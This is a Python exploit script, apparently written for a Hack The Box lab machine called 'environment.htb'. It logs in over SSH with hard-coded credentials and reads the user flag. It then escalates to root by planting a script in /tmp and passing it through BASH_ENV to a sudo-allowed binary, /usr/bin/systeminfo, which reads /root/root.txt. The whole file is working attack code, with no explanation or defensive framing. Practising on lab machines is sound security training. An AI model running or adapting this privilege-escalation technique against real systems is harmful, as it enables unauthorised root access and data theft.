import paramiko
import threading

# SSH Credentials
SSH_HOST = "environment.htb"
SSH_PORT = 22
SSH_USER = "hish"
SSH_PASSWORD = "marineSPm@ster!!"  

# Commands to execute
COMMANDS = [
    "cat /home/hish/user.txt",           
    "echo 'cat /root/root.txt' > /tmp/.exploit.sh",
    "chmod +x /tmp/.exploit.sh",
    '''echo "marineSPm@ster!!" | BASH_ENV=/tmp/.exploit.sh sudo /usr/bin/systeminfo''',
    

]

def ssh_tunnel():
    """Connect to SSH and execute commands"""
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Connect to SSH
        client.connect(SSH_HOST, SSH_PORT, username=SSH_USER, password=SSH_PASSWORD)
        print(f"Connected to {SSH_HOST} via SSH\n")

        # Execute commands
        for command in COMMANDS:
            print(f"Executing: {command}")
            stdin, stdout, stderr = client.exec_command(command)
            output = stdout.read().decode()
            error = stderr.read().decode()

            if output:
                print(f"OUTPUT:\n{output}")
            if error:
                print(f"ERROR:\n{error}")

        client.close()

    except Exception as e:
        print(f"SSH error: {e}")


if __name__ == "__main__":
    ssh_tunnel()
